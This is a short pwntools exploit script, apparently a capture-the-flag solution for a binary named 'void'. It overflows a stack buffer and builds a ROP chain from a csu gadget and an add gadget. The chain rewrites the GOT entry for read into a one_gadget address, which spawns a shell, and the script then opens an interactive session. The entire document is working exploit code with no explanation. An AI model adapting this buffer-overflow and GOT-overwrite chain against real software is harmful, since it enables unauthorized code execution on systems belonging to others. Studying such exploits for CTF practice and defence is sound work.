#!/usr/bin/env python3

from pwn import *

exe = ELF("./void_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

p = process()
gdb.attach(p,gdbscript='''
       b*vuln+32
       ''')
input()

csu = 0x004011b2
off_to_og = 0xc961a - libc.sym['read'] #one_gadget - read
add_off = 0x0000000000401108
payload = b'a'*64 + b'b'*8
payload += p64(csu)
payload += p64(off_to_og, sign=True) #pop rbx
payload += p64(exe.got['read']+0x3d) #pop rbp (plus 0x3d because gadget add)
payload += p64(0)*4 #pop r12 r13 r14 r15
payload += p64(add_off) #gadget add
payload += p64(exe.sym['read'])
p.send(payload)
p.interactive()
